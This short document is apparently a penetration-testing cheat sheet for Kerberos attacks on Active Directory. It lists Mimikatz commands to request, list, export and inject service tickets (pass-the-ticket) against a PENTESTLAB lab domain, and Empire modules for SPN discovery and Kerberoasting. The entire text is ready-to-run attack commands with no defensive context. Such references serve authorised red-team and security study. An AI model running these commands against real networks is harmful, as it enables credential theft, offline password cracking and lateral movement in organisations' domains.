# Mimikatz

**Service Ticket Request**
```
kerberos::ask /target:PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80
```
**List Available Tickets**
```
kerberos::list
```
**Export Service Tickets**
```
kerberos::list /export
```
**Inject Ticket**
```
kerberos::ptt PENTESTLAB.kirbi
```
# Empire

**SPN Discovery**
```
usemodule situational_awareness/network/get_spn
```
**Kerberoast**
```
usemodule credentials/invoke_kerberoast
```
